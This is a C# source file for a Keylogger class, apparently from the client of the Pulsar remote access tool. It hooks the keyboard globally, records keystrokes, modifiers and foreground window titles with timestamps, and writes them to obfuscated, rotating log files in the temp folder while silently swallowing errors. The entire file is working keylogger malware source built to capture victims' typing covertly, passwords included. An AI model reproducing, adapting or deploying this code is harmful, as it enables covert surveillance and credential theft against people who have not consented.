using Gma.System.MouseKeyHook;
using Pulsar.Client.Helper;
using Pulsar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace Pulsar.Client.Logging
{
    public class Keylogger : IDisposable
    {
        private readonly long _maxLogFileSize;
        private readonly Timer _flushTimer;
        private readonly StringBuilder _lineBuffer = new StringBuilder();
        private readonly object _syncLock = new object();
        private readonly IKeyboardMouseEvents _events;

        private string _currentWindow = "";
        private DateTime _lastWindowChange = DateTime.UtcNow;
        private readonly TimeSpan _windowChangeThreshold = TimeSpan.FromSeconds(1);

        private string _logFilePath;
        private bool _isFirstWrite = true;

        private readonly HashSet<Keys> _heldModifiers = new HashSet<Keys>();

        public bool IsDisposed { get; private set; }

        public Keylogger(double flushInterval, long maxLogFileSize)
        {
            _maxLogFileSize = maxLogFileSize;
            _logFilePath = GetLogFilePath();

            _events = Hook.GlobalEvents();

            _flushTimer = new Timer(flushInterval)
            {
                AutoReset = true
            };
            _flushTimer.Elapsed += TimerElapsed;
        }

        public void Start()
        {
            Subscribe();
            _flushTimer.Start();
        }

        private void Subscribe()
        {
            _events.KeyDown += OnKeyDown;
            _events.KeyUp += OnKeyUp;
            _events.KeyPress += OnKeyPress;
        }

        private void Unsubscribe()
        {
            _events.KeyDown -= OnKeyDown;
            _events.KeyUp -= OnKeyUp;
            _events.KeyPress -= OnKeyPress;
        }

        // ------------------------------------------------------------
        // Window change detection + special key handling
        // ------------------------------------------------------------
        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            string win = NativeMethodsHelper.GetForegroundWindowTitle() ?? "Unknown Window";

            lock (_syncLock)
            {
                bool windowChanged = !string.Equals(win, _currentWindow, StringComparison.Ordinal);

                if (windowChanged && DateTime.UtcNow - _lastWindowChange > _windowChangeThreshold)
                {
                    FlushLineBuffer();
                    _currentWindow = win;
                    _lastWindowChange = DateTime.UtcNow;
                    _lineBuffer.AppendLine($"[{DateTime.Now:HH:mm:ss}] {win}");
                }

                HandleKeyDownLogic(e);
            }
        }

        // ------------------------------------------------------------
        // Modifier key tracking + special key printing
        // ------------------------------------------------------------
        private void HandleKeyDownLogic(KeyEventArgs e)
        {
            if (IsModifierKey(e.KeyCode))
            {
                _heldModifiers.Add(e.KeyCode);
                return;
            }

            string mods = BuildModifierString();
            string keyText = GetSpecialKeyText(e.KeyCode);

            if (!string.IsNullOrEmpty(keyText))
            {
                _lineBuffer.Append(mods + keyText);
                if (keyText == "[Enter]")
                {
                    _lineBuffer.AppendLine();
                    FlushLineBuffer();
                }
                return;
            }

            // Default: ignore other non-printable keys
        }

        // Maps KeyCode to exact [Key] format
        private string GetSpecialKeyText(Keys key)
        {
            switch (key)
            {
                case Keys.Enter:
                    return "[Enter]";
                case Keys.Back:
                    return "[Back]";
                case Keys.Tab:
                    return "[Tab]";
                case Keys.Escape:
                    return "[Esc]";
                case Keys.Delete:
                    return "[Del]";
                case Keys.Up:
                    return "[Up]";
                case Keys.Down:
                    return "[Down]";
                case Keys.Left:
                    return "[Left]";
                case Keys.Right:
                    return "[Right]";
                case Keys.F1:
                    return "[F1]";
                case Keys.F2:
                    return "[F2]";
                case Keys.F3:
                    return "[F3]";
                case Keys.F4:
                    return "[F4]";
                case Keys.F5:
                    return "[F5]";
                case Keys.F6:
                    return "[F6]";
                case Keys.F7:
                    return "[F7]";
                case Keys.F8:
                    return "[F8]";
                case Keys.F9:
                    return "[F9]";
                case Keys.F10:
                    return "[F10]";
                case Keys.F11:
                    return "[F11]";
                case Keys.F12:
                    return "[F12]";
                case Keys.F13:
                    return "[F13]";
                case Keys.F14:
                    return "[F14]";
                case Keys.F15:
                    return "[F15]";
                case Keys.F16:
                    return "[F16]";
                case Keys.F17:
                    return "[F17]";
                case Keys.F18:
                    return "[F18]";
                case Keys.F19:
                    return "[F19]";
                case Keys.F20:
                    return "[F20]";
                case Keys.F21:
                    return "[F21]";
                case Keys.F22:
                    return "[F22]";
                case Keys.F23:
                    return "[F23]";
                case Keys.F24:
                    return "[F24]";
                default:
                    return null;
            }
        }

        // ------------------------------------------------------------
        // Proper backspace: deletes OR logs "[Back]"
        // ------------------------------------------------------------
        private void HandleBackspace(string mods)
        {
            if (_lineBuffer.Length > 0)
            {
                _lineBuffer.Length -= 1;
            }
            else
            {
                _lineBuffer.Append(mods + "[Back]");
            }
        }

        // ------------------------------------------------------------
        // KeyPress handles printable characters only
        // ------------------------------------------------------------
        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            lock (_syncLock)
            {
                if (!char.IsControl(e.KeyChar))
                {
                    string mods = BuildModifierString();
                    _lineBuffer.Append(mods + e.KeyChar);
                }
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            if (_heldModifiers.Contains(e.KeyCode))
                _heldModifiers.Remove(e.KeyCode);
        }

        // ------------------------------------------------------------
        // Helper: modifier printing
        // ------------------------------------------------------------
        private bool IsModifierKey(Keys k)
        {
            return k == Keys.LShiftKey || k == Keys.RShiftKey ||
                   k == Keys.LControlKey || k == Keys.RControlKey ||
                   k == Keys.LMenu || k == Keys.RMenu;
        }

        private string BuildModifierString()
        {
            if (_heldModifiers.Count == 0)
                return "";

            StringBuilder sb = new StringBuilder();
            foreach (var m in _heldModifiers)
                sb.Append($"[{m.ToString().Replace("Key", "")}]");

            return sb.ToString();
        }

        // ------------------------------------------------------------
        // Timer flush
        // ------------------------------------------------------------
        private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            try { FlushLineBuffer(); } catch { }
        }

        private void FlushLineBuffer()
        {
            lock (_syncLock)
            {
                if (_lineBuffer.Length == 0) return;

                string content = _lineBuffer.ToString();
                _lineBuffer.Clear();

                content = System.Text.RegularExpressions.Regex.Replace(content, @"[ ]{2,}", " ");

                WriteToFile(content);
            }
        }

        // ------------------------------------------------------------
        // File writing + rotation
        // ------------------------------------------------------------
        private void WriteToFile(string content)
        {
            if (string.IsNullOrWhiteSpace(content)) return;

            try
            {
                FileHelper.WriteObfuscatedLogFile(_logFilePath, content + Environment.NewLine);

                if (new FileInfo(_logFilePath).Length > _maxLogFileSize)
                    RotateLogFile();

                _isFirstWrite = false;
            }
            catch { }
        }

        private void RotateLogFile()
        {
            try
            {
                string baseName = DateTime.UtcNow.ToString("yyyy-MM-dd");
                string basePath = Path.Combine(Path.GetTempPath(), baseName);
                string newFilePath = basePath + ".txt";

                int n = 1;
                while (File.Exists(newFilePath))
                {
                    newFilePath = $"{basePath}_{n:00}.txt";
                    n++;
                }

                _logFilePath = newFilePath;
                _isFirstWrite = true;
            }
            catch { }
        }

        private string GetLogFilePath()
        {
            return Path.Combine(Path.GetTempPath(), DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
        }

        // ------------------------------------------------------------
        // Dispose
        // ------------------------------------------------------------
        public void FlushImmediately() => FlushLineBuffer();

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (IsDisposed) return;

            if (disposing)
            {
                FlushLineBuffer();
                Unsubscribe();
                _flushTimer.Stop();
                _flushTimer.Dispose();
                _events.Dispose();
            }

            IsDisposed = true;
        }
    }
}
